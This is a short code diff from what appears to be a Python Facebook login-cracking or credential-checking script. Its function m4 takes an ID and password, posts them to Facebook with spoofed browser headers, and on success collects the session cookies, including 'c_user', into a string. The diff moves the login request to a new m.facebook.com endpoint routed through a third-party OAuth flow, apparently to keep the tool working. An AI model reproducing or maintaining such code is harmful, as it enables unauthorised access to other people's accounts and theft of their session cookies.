@@ -1209,11 +1209,11 @@ def m4(idf,pwv):
     'Sec-Fetch-User': '?1',
     'Sec-Fetch-Dest': 'document',
     'Cache-Control': 'max-age=0',
-    'Referer': 'https://mbasic.beta.facebook.com/',
+    'Referer': 'https://m.facebook.com/',
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=101',data=log_data,headers=header_freefb).text
+   lo = session.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=740202109352935&kid_directed_site=0&app_id=740202109352935&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv20.0%2Fdialog%2Foauth%3Fclient_id%3D740202109352935%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%26state%3D36a7f6174cc0fa6f1dfb44bdff0ede0d703b704d6322a2c79e25ce86af3b9e98%26redirect_uri%3Dhttps%253A%252F%252Fwww.facebookblueprint.com%252Fauthentication%252Ffb_callback%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0deafc3b-e77f-450c-8b9b-43044933610b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.facebookblueprint.com%2Fauthentication%2Ffb_callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D36a7f6174cc0fa6f1dfb44bdff0ede0d703b704d6322a2c79e25ce86af3b9e98%23_%3D_&display=touch&locale=en_US&pl_dbl=0&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
